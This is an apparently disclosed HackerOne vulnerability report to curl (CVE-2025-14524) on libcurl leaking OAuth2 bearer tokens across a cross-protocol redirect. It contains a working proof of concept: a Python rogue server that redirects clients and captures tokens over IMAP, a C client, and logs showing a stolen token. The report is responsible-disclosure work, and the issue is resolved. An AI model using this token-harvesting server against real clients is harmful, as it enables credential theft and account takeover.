{
  "id": 3459417,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDU5NDE3",
  "url": "https://hackerone.com/reports/3459417",
  "title": "CVE-2025-14524: bearer token leak on cross-protocol redirect",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2025-12-09T18:01:03.640Z",
  "submitted_at": "2025-12-09T18:01:03.982Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "is_triager?": false,
  "reporter": {
    "disabled": false,
    "username": "anonymous_237",
    "url": "/anonymous_237",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 35663,
    "url": "https://hackerone.com/curl",
    "handle": "curl",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "curl",
      "twitter_handle": "",
      "website": "https://curl.se",
      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2025-14524"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2026-01-07T10:13:47.196Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2026-01-07T07:30:45.674Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nA vulnerability exists in `libcurl` regarding the handling of OAuth2 Bearer tokens (`CURLOPT_XOAUTH2_BEARER`) during HTTP redirects.\n\nWhile `libcurl` correctly clears standard authentication credentials (`CURLOPT_USERPWD`) when following a redirect to a different host, port, or protocol (a security hardening introduced to fix CVE-2022-27774), it fails to apply the same logic to the OAuth2 Bearer token.\n\nIf an application using `libcurl` connects to a trusted server but is redirected to a malicious server (e.g., via an Open Redirect vulnerability) on a protocol supporting SASL (like IMAP, SMTP, or POP3), the valid Bearer token is automatically sent to the attacker. This happens because the token remains in the handle and is reused for the new connection, allowing the attacker to steal the credentials.\n\n**AI Statement:** This report was researched and generated with the assistance of an AI agent to analyze the `libcurl` source code and identify inconsistent state management logic. However, the vulnerability has been manually verified, the Proof of Concept code was compiled and executed locally, and the findings have been confirmed against a custom TCP server to ensure validity and reproducibility.\n\n## Affected version\nThe vulnerability was reproduced on the following version:\n\n```text\ncurl 8.5.0 (x86_64-pc-linux-gnu) libcurl/8.5.0 OpenSSL/3.0.13 zlib/1.3 brotli/1.1.0 zstd/1.5.5 libidn2/2.3.7 libpsl/0.21.2 (+libidn2/2.3.7) libssh/0.10.6/openssl/zlib nghttp2/1.59.0 librtmp/2.3 OpenLDAP/2.6.7\nRelease-Date: 2023-12-06, security patched: 8.5.0-2ubuntu10.6\nProtocols: dict file ftp ftps gopher gophers http https imap imaps ldap ldaps mqtt pop3 pop3s rtmp rtsp scp sftp smb smbs smtp smtps telnet tftp\nFeatures: alt-svc AsynchDNS brotli GSS-API HSTS HTTP2 HTTPS-proxy IDN IPv6 Kerberos Largefile libz NTLM PSL SPNEGO SSL threadsafe TLS-SRP UnixSockets zstd\n```\n\n## Vulnerable Code Analysis\n\nThe issue lies in the HTTP redirect handling logic (typically within `lib/http.c`, function `Curl_http_follow` or similar transfer logic depending on the version).\n\nWhen `libcurl` detects a redirect that crosses a security boundary (change of host, port, or protocol), it explicitly clears the username and password to prevent leaks. However, it overlooks the Bearer token string.\n\n```c\n/* Pseudo-code representation of the logic in lib/http.c */\n\n/* ... inside redirect handling ... */\nif(!data->set.allow_auth_to_other_hosts && (type != FOLLOW_FAKE)) {\n    /* Logic to detect host/port/protocol change */\n    \n    if(clear) {\n        /* CVE-2022-27774 Fix: Clears standard credentials */\n        Curl_safefree(data->state.aptr.user);\n        Curl_safefree(data->state.aptr.passwd);\n        \n        /* VULNERABILITY: The OAuth2 Bearer token is NOT cleared here. */\n        /* Missing: Curl_safefree(data->set.str[STRING_BEARER]); */\n    }\n}\n```\n\nBecause `data->set.str[STRING_BEARER]` is not cleared, when the new connection to the redirected URL (e.g., `imap://attacker.com`) is established, `libcurl` sees a valid Bearer token in the handle and attempts to use it for SASL authentication (`AUTHENTICATE XOAUTH2`), leaking the secret.\n\n## Steps To Reproduce:\n\nWe simulate a scenario where a client connects to a trusted HTTP server but is redirected to a rogue IMAP server controlled by the attacker.\n\n  1.  **Start the Rogue Server:** Run the provided `rogue_server.py`. It listens on port 8080 (HTTP) and port 1430 (IMAP). It will redirect HTTP requests to the IMAP port with a forced username to trigger SASL authentication.\n  2.  **Compile the Vulnerable Client:** Compile `poc.c` using `gcc -o poc poc.c -lcurl`. This client sets a Bearer token and enables redirects.\n  3.  **Run the Client:** Execute `./poc`.\n  4.  **Observe the Leak:** The `rogue_server.py` output will display the stolen Bearer token received on the IMAP port.\n\n## Supporting Material/References:\n\n### 1. Rogue Server (`rogue_server.py`)\n```python\nimport socket\nimport threading\nimport re\n\ndef http_redirector():\n    host = '127.0.0.1'\n    port = 8080\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        s.bind((host, port))\n        s.listen(1)\n        print(f\"[HTTP] Redirector listening on {host}:{port}\")\n        conn, addr = s.accept()\n        with conn:\n            req = conn.recv(1024)\n            # ASTUCE : On redirige vers \"imap://victim@...\"\n            # Cela donne à curl un utilisateur pour la nouvelle connexion,\n            # ce qui lui permet de tenter l'auth SASL avec le token \"oublié\".\n            redirect = (\n                \"HTTP/1.1 301 Moved Permanently\\r\\n\"\n                \"Location: imap://victim@127.0.0.1:1430/\\r\\n\"\n                \"Content-Length: 0\\r\\n\\r\\n\"\n            )\n            conn.sendall(redirect.encode())\n            print(\"[HTTP] Sent 301 Redirect to imap://victim@127.0.0.1:1430/\")\n\ndef imap_stealer():\n    host = '127.0.0.1'\n    port = 1430\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        s.bind((host, port))\n        s.listen(1)\n        print(f\"[IMAP] Stealer listening on {host}:{port}\")\n        \n        conn, addr = s.accept()\n        with conn:\n            print(f\"[IMAP] Victim connected from {addr}\")\n            conn.sendall(b\"* OK [CAPABILITY IMAP4rev1 AUTH=XOAUTH2] Rogue Ready\\r\\n\")\n            \n            while True:\n                data = conn.recv(4096).decode('utf-8', 'ignore')\n                if not data: break\n                print(f\"[IMAP] Received: {data.strip()}\")\n                \n                tag_match = re.match(r\"^(\\w+)\\s\", data)\n                tag = tag_match.group(1) if tag_match else \"*\"\n\n                if \"CAPABILITY\" in data.upper():\n                    response = f\"* CAPABILITY IMAP4rev1 AUTH=XOAUTH2\\r\\n{tag} OK Capability completed\\r\\n\"\n                    conn.sendall(response.encode())\n                \n                elif \"LIST\" in data.upper():\n                    # On refuse le LIST pour forcer l'auth\n                    response = f\"{tag} NO [AUTHENTICATIONREQUIRED] Please login first\\r\\n\"\n                    conn.sendall(response.encode())\n\n                elif \"AUTHENTICATE XOAUTH2\" in data.upper():\n                    conn.sendall(b\"+\\r\\n\")\n                    token_data = conn.recv(4096).decode('utf-8', 'ignore')\n                    print(\"\\n\" + \"=\"*50)\n                    print(f\"[!!!] STOLEN TOKEN: {token_data.strip()}\")\n                    print(\"=\"*50 + \"\\n\")\n                    break\n\nif __name__ == \"__main__\":\n    t1 = threading.Thread(target=http_redirector)\n    t2 = threading.Thread(target=imap_stealer)\n    t1.start()\n    t2.start()\n\n```\n\n### 2. Vulnerable Client (`poc.c`)\nNote: `CURLOPT_UNRESTRICTED_AUTH` is **NOT** enabled. The credentials should be protected, but the Bearer token leaks.\n\n```c\n#include <stdio.h>\n#include <curl/curl.h>\n\nint main(void) {\n    CURL *curl;\n    const char *secret_token = \"MY_SECRET_GOLDEN_TICKET\";\n\n    printf(\"--- PoC V4: OAuth2 Bearer Token Leak on Redirect ---\\n\");\n\n    curl_global_init(CURL_GLOBAL_ALL);\n    curl = curl_easy_init();\n\n    if(curl) {\n        // 1. URL HTTP initiale\n        curl_easy_setopt(curl, CURLOPT_URL, \"http://127.0.0.1:8080/resource\");\n\n        // 2. Configuration du Token\n        curl_easy_setopt(curl, CURLOPT_XOAUTH2_BEARER, secret_token);\n        \n        // 3. On met un user initial (optionnel, mais réaliste)\n        curl_easy_setopt(curl, CURLOPT_USERNAME, \"initial_user\");\n\n        // 4. Autoriser la redirection\n        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);\n        // On autorise explicitement IMAP car les versions récentes de curl\n        // sont restrictives sur les protocoles par défaut.\n        curl_easy_setopt(curl, CURLOPT_REDIR_PROTOCOLS_STR, \"http,https,imap\");\n\n        // 5. IMPORTANT : On n'active PAS CURLOPT_UNRESTRICTED_AUTH.\n        // Le but est de prouver que le token fuite MÊME quand curl essaie de sécuriser les identifiants.\n\n        // Debug\n        curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);\n\n        printf(\"[*] Sending request...\\n\");\n        curl_easy_perform(curl);\n\n        curl_easy_cleanup(curl);\n    }\n    return 0;\n}\n\n```\n\n### 3. Execution Logs\nOutput from the `rogue_server.py` terminal showing the successful theft of the token:\n\n```text\n\npython3 rogue_server.py\n[HTTP] Redirector listening on 127.0.0.1:8080\n[IMAP] Stealer listening on 127.0.0.1:1430\n[HTTP] Sent 301 Redirect to imap://victim@127.0.0.1:1430/\n[IMAP] Victim connected from ('127.0.0.1', 36232)\n[IMAP] Received: B001 CAPABILITY\n[IMAP] Received: B002 AUTHENTICATE XOAUTH2\n\n==================================================\n[!!!] STOLEN TOKEN: dXNlcj12aWN0aW0BYXV0aD1CZWFyZXIgTVlfU0VDUkVUX0dPTERFTl9USUNLRVQBAQ==\n==================================================\n\n\n```\n*(Decoded token: `user=victim^Aauth=Bearer MY_SECRET_GOLDEN_TICKET^A^A`)*\n\n## Impact\n\nThis vulnerability leads to a critical breach of credential confidentiality:\n\n**1. Theft of Sensitive OAuth2 Tokens:**\nThe primary impact is the exfiltration of the valid Bearer token to an attacker-controlled server. Unlike Basic Auth passwords which might be site-specific, OAuth2 tokens often grant broad access to APIs, user data (emails, files), or Single Sign-On (SSO) sessions.\n\n**2. Account Takeover & Impersonation:**\nArmed with the stolen token, an attacker can impersonate the victim against the legitimate service provider (e.g., Gmail, Office 365, or internal APIs). They can perform any action permitted by the token's scope (e.g., reading private emails, modifying data) without the user's knowledge.\n\n**3. Bypass of Security Hardening (CVE-2022-27774 Regression):**\nThis vulnerability effectively bypasses the security protections introduced in CVE-2022-27774. While `libcurl` successfully protects legacy `user:password` credentials from leaking during cross-protocol redirects, it fails to protect modern OAuth2 credentials, leaving applications that rely on `libcurl`'s default security behavior vulnerable.",
  "weakness": {
    "id": 87,
    "name": "Insufficiently Protected Credentials"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2026-02-06T07:30:45.942Z",
  "allow_singular_disclosure_after": 2579136.955047433,
  "singular_disclosure_allowed": false,
  "vote_count": 1,
  "voters": [
    "2026"
  ],
  "severity": {
    "rating": "low",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 18844,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/curl/curl",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
